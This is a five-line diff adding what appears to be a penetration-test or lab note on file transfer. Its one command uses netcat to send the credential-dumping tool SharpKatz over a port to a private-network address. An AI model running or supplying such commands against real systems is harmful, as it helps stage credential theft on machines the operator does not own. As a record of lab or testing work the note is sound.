@@ -1,0 +1,5 @@
+###### FILE_TRANSFER ######
+### CONNECTING ###
+UPLOAD
+nc -q 0 192.168.49.128 8000 < SharpKatz.exe
+
